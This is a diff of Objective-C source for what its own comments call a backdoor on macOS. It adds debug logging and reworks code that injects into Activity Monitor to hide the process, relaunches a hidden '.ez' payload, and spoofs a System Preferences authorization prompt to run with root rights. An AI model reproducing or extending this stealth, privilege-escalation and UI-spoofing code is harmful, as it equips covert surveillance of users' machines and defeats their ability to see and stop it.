 #ifdef DEBUG_CORE
           //infoLog(@"Hiding OSAX");
@@ -2944,7 +3180,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
 #ifndef NO_PROC_HIDING
   // Inject running ActivityMonitor
-  if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
+  if ([gUtil isLeopard] == NO && geteuid() == 0)
     {
       NSNumber *pActivityM = pidForProcessName(@"Activity Monitor");
       
@@ -3193,21 +3429,23 @@ static void computerWillShutdown(CFMachPortRef port,
     return;
   }
   
-  if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
+  if (getuid() == 0)
     {
-      // temporary thread for fixing euid/uid escalation
-      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
-                               toTarget: self 
-                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
-    }
-  else if (gOSMajor == 10 && gOSMinor == 5 && geteuid() == 0)
-    {
-      // Only for leopard send pid to new activity monitor via shmem
-      if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
-      //if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
+      if ([gUtil isLeopard])
         {
-          // Write command with pid
-          [self shareCorePidOnShMem];
+          // Only for leopard send pid to new activity monitor via shmem
+          if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
+            {
+              // Write command with pid
+              [self shareCorePidOnShMem];
+            }
+        }
+      else
+        {
+          // temporary thread for fixing euid/uid escalation
+          [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
+                                   toTarget: self 
+                                 withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
         }
     }
   
@@ -3433,6 +3671,10 @@ static void computerWillShutdown(CFMachPortRef port,
   // If we're authorized we can execute now our backdoor properly
   if (amIAlreadyAuthorized == YES)
     {
+#ifdef DEBUG_CORE
+      infoLog(@"Already authorized, relaunching the original file");
+#endif
+    
       NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                  [[NSBundle mainBundle] bundlePath]];
       
@@ -3447,10 +3689,13 @@ static void computerWillShutdown(CFMachPortRef port,
           execPath = [[_searchedFile objectAtIndex: 0]
                       stringByReplacingOccurrencesOfString: @".ez"
                       withString: @""];
+#ifdef DEBUG_CORE
+          infoLog(@"execPath: %@", execPath);
+#endif
         }
       else
         {
-#ifdef DEBUG_UI_SPOOF
+#ifdef DEBUG_CORE
           errorLog(@"ez file not found");
 #endif
           exit(-1);
@@ -3489,6 +3734,10 @@ static void computerWillShutdown(CFMachPortRef port,
   authEnvironment.count = 1;
   authEnvironment.items = &myAuthItems;
   
+#ifdef DEBUG_CORE
+  infoLog(@"Creating authorization");
+#endif
+  
   //
   // Create an empty auth ref to fill later
   //
@@ -3503,8 +3752,8 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   if (myStatus != errAuthorizationSuccess)
     {
-#ifdef DEBUG_UI_SPOOF
-      errorLog(@"[EE] Error while creating the empty Authorization Reference\n");
+#ifdef DEBUG_CORE
+      errorLog(@"Error while creating the empty Authorization Reference");
 #endif
       //return myStatus;
     }
@@ -3559,7 +3808,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (execPath == nil)
     {
-      if (gOSMajor == 10 && gOSMinor == 5)
+      if ([gUtil isLeopard])
         {
           NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                      [[NSBundle mainBundle] bundlePath]];
@@ -3578,19 +3827,23 @@ static void computerWillShutdown(CFMachPortRef port,
             }
           else
             {
-#ifdef DEBUG_UI_SPOOF
+#ifdef DEBUG_CORE
               errorLog(@"ez file not found");
 #endif
               exit(-1);
             }
         }
-      else if (gOSMajor == 10 && gOSMinor == 6)
+      else
         {
           execPath = [NSString stringWithFormat: @"%@",
                       [[[NSBundle mainBundle] bundlePath]
                        stringByAppendingPathComponent: @"System Preferences"]];
         }
     }
+  
+#ifdef DEBUG_CORE
+  infoLog(@"Executing with auth (%@)", execPath);
+#endif
   
   //
   // Do IT Bitch!
@@ -3603,12 +3856,15 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (myStatus != errAuthorizationSuccess)
     {
-#ifdef DEBUG_UI_SPOOF
+#ifdef DEBUG_CORE
       errorLog(@"Error on last step");
 #endif
     }
   else
     {
+#ifdef DEBUG_CORE
+      infoLog(@"Auth executed with success (%s)", myReadBuffer);
+#endif
       read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
       fclose(myCommunicationsPipe);
     }
@@ -3621,6 +3877,10 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
   
+#ifdef DEBUG_CORE
+  warnLog(@"Quitting from auth");
+#endif
+
   exit(0);
 }
 
